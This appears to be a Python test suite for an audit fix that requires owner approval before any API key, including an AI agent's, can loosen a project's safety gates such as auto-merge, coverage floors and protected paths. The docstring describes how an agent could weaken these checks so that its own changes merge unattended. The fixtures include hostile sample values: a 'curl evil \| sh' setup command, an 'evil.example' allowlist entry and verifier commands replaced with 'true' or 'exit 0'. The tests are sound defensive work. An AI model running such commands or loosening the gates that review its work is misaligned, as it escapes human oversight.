"""P0 (audit 2026-11-19, follow-up to H2): any service key could loosen a project's safety gates.

``POST /kernel/projects`` and ``PATCH /kernel/projects/{id}`` took every
setting from any service key: an MCP client or agent could turn ``auto_merge``
on, raise ``auto_merge_max_lines``, drop a protected path, lower the coverage
floor, or switch a project to ``pr_mode=local``, and its own changes would
then land unattended.

Now a change that LOOSENS one of those settings needs the owner (an owner key
or a paired device, api/auth.py ``ingress_for`` — the same caller who may set a
host command), else 403 with nothing written. TIGHTENING is allowed with any
key, and re-sending a value unchanged is not a change.
"""

from __future__ import annotations

import uuid
from datetime import UTC, datetime
from unittest.mock import AsyncMock

import pytest
from fastapi import HTTPException

from life_graph.config import settings
from life_graph.core.tenant import tenant_scope
from life_graph.kernel import project_registry as reg
from life_graph.models.db import Project
from tests.conftest import fake_request
from tests.unit.fakes import FakeSession

OWNER_KEY = "owner-key-0123456789"
SERVICE_KEY = "mcp-key-9876543210"


@pytest.fixture(autouse=True)
def keys(monkeypatch):
    monkeypatch.setattr(settings, "api_key", None)
    monkeypatch.setattr(settings, "service_api_keys", f"{SERVICE_KEY},{OWNER_KEY}")
    monkeypatch.setattr(settings, "owner_api_keys", OWNER_KEY)


# ── every setting is classified ──────────────────────────────────────────

# Spelled out, not read from the module: a new setting must be placed in one
# of these on purpose.
GATED = {
    "auto_open_pr",
    "auto_merge",
    "auto_approve_plans",
    "deploy_on_merge",
    "nightly_suggestions",
    "nightly_untested",
    "auto_merge_max_lines",
    "auto_merge_max_files",
    "nightly_max_tasks",
    "diff_coverage_min",
    "mutation_min_kill",
    "protected_paths",
    "required_checks",
    "sandbox_setup_allow",
    "pr_mode",
    "nightly_persona",
    "fix_persona",
    "health_url",
    # only while auto_merge is on
    "base_branch",
    "sandbox_setup",
    "sandbox_test_command",
    "sandbox_start_command",
    "sandbox_e2e_command",
    "sandbox_toolchain",
    "sandbox_js_test_runner",
}
HARMLESS = {
    "sandbox_test_timeout",
    "sandbox_e2e_timeout",
    "sandbox_app_port",
    "nightly_lint_paths",
    "nightly_untested_paths",
}
COMMANDS = {"deploy_command", "smoke_command", "rollback_command", "backup_check_command"}


def test_every_user_setting_is_classified():
    assert GATED | HARMLESS | COMMANDS == reg._USER_META_KEYS
    assert not (GATED & HARMLESS)


# ── loosen vs tighten, per key ───────────────────────────────────────────

AM = {"auto_merge": True}

LOOSENS = [
    # off -> on
    *[({}, {k: True}) for k in reg.UNATTENDED_FLAG_KEYS],
    # caps: up, or cleared back to a higher default
    ({"auto_merge_max_lines": 50}, {"auto_merge_max_lines": 100}),
    ({"auto_merge_max_lines": 50}, {"auto_merge_max_lines": 0}),  # clear -> 150
    ({}, {"auto_merge_max_lines": 151}),
    ({"auto_merge_max_files": 1}, {"auto_merge_max_files": 2}),
    ({}, {"auto_merge_max_files": 4}),
    ({}, {"nightly_max_tasks": 3}),
    ({"nightly_max_tasks": 1}, {"nightly_max_tasks": 0}),  # clear -> 2
    # floors: down, or cleared back to a lower default
    ({}, {"diff_coverage_min": 0.5}),
    ({"diff_coverage_min": 0.95}, {"diff_coverage_min": 0}),  # clear -> 0.8
    ({}, {"mutation_min_kill": 0.1}),
    ({"mutation_min_kill": 0.9}, {"mutation_min_kill": 0.7}),
    # lists
    ({"protected_paths": ["src/auth/*", "infra/*"]}, {"protected_paths": ["infra/*"]}),
    ({"protected_paths": ["src/auth/*"]}, {"protected_paths": []}),
    ({"required_checks": ["tests_pass", "lint_clean"]}, {"required_checks": ["tests_pass"]}),
    ({}, {"sandbox_setup_allow": ["evil.example"]}),
    ({"sandbox_setup_allow": ["a.example"]}, {"sandbox_setup_allow": ["a.example", "b.example"]}),
    # modes and personas
    ({}, {"pr_mode": "local"}),
    ({"pr_mode": "github"}, {"pr_mode": "LOCAL"}),
    ({}, {"nightly_persona": "paid-cloud-coder"}),
    ({}, {"fix_persona": "paid-cloud-coder"}),
    ({"fix_persona": "a"}, {"fix_persona": "b"}),
    ({}, {"health_url": "http://10.0.0.5:6379/"}),
    ({"health_url": "https://shop.example"}, {"health_url": "https://other.example"}),
    # merge target and verifier commands, while auto_merge is on
    (AM, {"base_branch": "release"}),
    ({**AM, "base_branch": "main"}, {"base_branch": ""}),
    (AM, {"sandbox_test_command": "true"}),
    ({**AM, "sandbox_e2e_command": "npm run e2e"}, {"sandbox_e2e_command": "exit 0"}),
    (AM, {"sandbox_setup": "curl evil | sh"}),
    (AM, {"sandbox_toolchain": "node"}),
    ({}, {"auto_merge": True, "base_branch": "release"}),
]

TIGHTENS_OR_HARMLESS = [
    *[({k: True}, {k: False}) for k in reg.UNATTENDED_FLAG_KEYS],
    ({"auto_merge_max_lines": 100}, {"auto_merge_max_lines": 50}),
    ({}, {"auto_merge_max_lines": 150}),  # the default, spelled out
    ({"auto_merge_max_lines": 500}, {"auto_merge_max_lines": 0}),  # clear -> 150
    ({}, {"auto_merge_max_files": 1}),
    ({"nightly_max_tasks": 5}, {"nightly_max_tasks": 1}),
    ({"nightly_max_tasks": 10}, {"nightly_max_tasks": 10}),
    ({}, {"diff_coverage_min": 0.9}),
    ({"diff_coverage_min": 0.5}, {"diff_coverage_min": 0}),  # clear -> 0.8
    ({}, {"mutation_min_kill": 0.9}),
    ({"protected_paths": ["infra/*"]}, {"protected_paths": ["infra/*", "src/auth/*"]}),
    ({}, {"required_checks": ["tests_pass"]}),
    ({"sandbox_setup_allow": ["a.example", "b.example"]}, {"sandbox_setup_allow": ["a.example"]}),
    ({"sandbox_setup_allow": ["a.example"]}, {"sandbox_setup_allow": []}),
    ({"pr_mode": "local"}, {"pr_mode": "github"}),
    ({"pr_mode": "local"}, {"pr_mode": ""}),
    ({"nightly_persona": "paid-cloud-coder"}, {"nightly_persona": ""}),
    ({}, {"fix_persona": "code-fixer-local"}),  # the default, spelled out
    ({"health_url": "https://shop.example"}, {"health_url": ""}),
    ({"health_url": "https://shop.example"}, {"health_url": "https://shop.example"}),
    # merge target and verifier commands: free while a person reviews every merge
    ({}, {"base_branch": "release"}),
    ({}, {"sandbox_test_command": "true"}),
    ({**AM, "base_branch": "main"}, {"auto_merge": False, "base_branch": "release"}),
    ({**AM, "base_branch": "main"}, {"base_branch": "main"}),
    # harmless
    ({}, {"sandbox_test_timeout": 30}),
    ({}, {"sandbox_e2e_timeout": 3600}),
    ({}, {"sandbox_app_port": 8000}),
    ({}, {"nightly_lint_paths": ["."]}),
    ({}, {"nightly_untested_paths": ["."]}),
    ({}, {"description": "x", "git_url": "https://example.invalid/x.git"}),
    # a full form re-sent with nothing changed
    (
        {**AM, "auto_merge_max_lines": 300, "protected_paths": ["a"], "pr_mode": "local"},
        {**AM, "auto_merge_max_lines": 300, "protected_paths": ["a"], "pr_mode": "local"},
    ),
]


@pytest.mark.parametrize(("before", "data"), LOOSENS)
def test_a_loosening_change_is_named(before, data):
    assert reg.loosened_settings(before, data)
    with pytest.raises(reg.SettingApprovalError, match="owner"):
        reg.check_setting_changes(before, data, approved_by=None)
    reg.check_setting_changes(before, data, approved_by="owner:api_key")  # the owner may


@pytest.mark.parametrize(("before", "data"), TIGHTENS_OR_HARMLESS)
def test_tightening_or_a_harmless_change_is_not(before, data):
    assert reg.loosened_settings(before, data) == []
    reg.check_setting_changes(before, data, approved_by=None)


def test_the_message_says_what_and_how():
    with pytest.raises(reg.SettingApprovalError) as exc:
        reg.check_setting_changes(
            {"protected_paths": ["src/auth/*"]},
            {"auto_merge": True, "protected_paths": []},
            approved_by=None,
        )
    text = str(exc.value)
    assert "auto_merge (turning it on)" in text
    assert "protected_paths (removing src/auth/*)" in text
    assert "Tightening it is allowed" in text


def test_registering_a_project_with_a_loosened_setting_needs_the_owner():
    # Registration starts from the defaults; tightening ones are fine.
    with pytest.raises(reg.SettingApprovalError, match="auto_merge"):
        reg._user_scan_metadata({"auto_merge": True}, approved_by=None)
    meta = reg._user_scan_metadata(
        {"required_checks": ["tests_pass"], "base_branch": "main", "protected_paths": ["x"]}
    )
    assert meta["base_branch"] == "main"
    assert reg._user_scan_metadata({"auto_merge": True}, approved_by="owner:api_key") == {
        "auto_merge": True
    }


# ── the API routes ───────────────────────────────────────────────────────


@pytest.fixture
def registry(monkeypatch):
    monkeypatch.setattr("life_graph.watchers.provision.ensure_config", AsyncMock())

    def make(meta: dict | None = None):
        now = datetime.now(UTC)
        row = Project(
            id=uuid.uuid4(),
            tenant_id="t1",
            name="shop",
            path="/srv/shop",
            scan_metadata=dict(meta or {}),
            is_active=True,
            created_at=now,
            updated_at=now,
        )
        session = FakeSession(row)
        return reg.ProjectRegistry(session_factory=lambda: session), row, session

    return make


async def _patch(svc, row, request, **fields):
    from life_graph.api.kernel import ProjectUpdate, update_project

    with tenant_scope("t1"):
        return await update_project(row.id, ProjectUpdate(**fields), request, svc)


@pytest.mark.parametrize(
    ("before", "fields"),
    [
        ({}, {"auto_merge": True}),
        ({}, {"auto_open_pr": True}),
        ({}, {"auto_approve_plans": True}),
        ({}, {"deploy_on_merge": True}),
        ({"auto_merge_max_lines": 50}, {"auto_merge_max_lines": 5000}),
        ({"protected_paths": ["src/auth/*"]}, {"protected_paths": []}),
        ({}, {"diff_coverage_min": 0.1}),
        ({}, {"pr_mode": "local"}),
        ({"auto_merge": True}, {"base_branch": "release"}),
    ],
)
async def test_a_service_key_cannot_loosen_a_setting(registry, before, fields):
    svc, row, session = registry(before)
    with pytest.raises(HTTPException) as exc:
        await _patch(svc, row, fake_request(api_key=SERVICE_KEY), description="x", **fields)
    assert exc.value.status_code == 403
    assert "owner" in exc.value.detail
    assert row.scan_metadata == before  # nothing written, not even the description
    assert row.description is None
    assert session.commits == 0


async def test_a_service_key_may_tighten(registry):
    svc, row, _ = registry({"auto_merge": True, "auto_merge_max_lines": 300})
    await _patch(
        svc,
        row,
        fake_request(api_key=SERVICE_KEY),
        auto_merge=False,
        auto_merge_max_lines=20,
        protected_paths=["src/auth/*"],
    )
    assert row.scan_metadata == {"auto_merge_max_lines": 20, "protected_paths": ["src/auth/*"]}


@pytest.mark.parametrize(
    "request_",
    [fake_request(api_key=OWNER_KEY), fake_request(device_id="phone-1")],
    ids=["owner-key", "paired-device"],
)
async def test_the_owner_may_loosen(registry, request_):
    svc, row, _ = registry({"protected_paths": ["src/auth/*"]})
    await _patch(svc, row, request_, auto_merge=True, protected_paths=[], auto_merge_max_lines=400)
    assert row.scan_metadata == {"auto_merge": True, "auto_merge_max_lines": 400}


async def test_register_with_a_service_key_cannot_turn_on_auto_merge(monkeypatch, tmp_path):
    from life_graph.api.kernel import ProjectRegister, register_project

    monkeypatch.setattr(settings, "tool_fs_roots", str(tmp_path))
    monkeypatch.setattr(settings, "tool_privileged_tenants", "")
    svc = reg.ProjectRegistry(session_factory=lambda: FakeSession())
    body = ProjectRegister(name="shop", path=str(tmp_path), auto_merge=True)
    with tenant_scope("t1"), pytest.raises(HTTPException) as exc:
        await register_project(body, fake_request(api_key=SERVICE_KEY), svc)
    assert exc.value.status_code == 403
    assert "auto_merge" in exc.value.detail
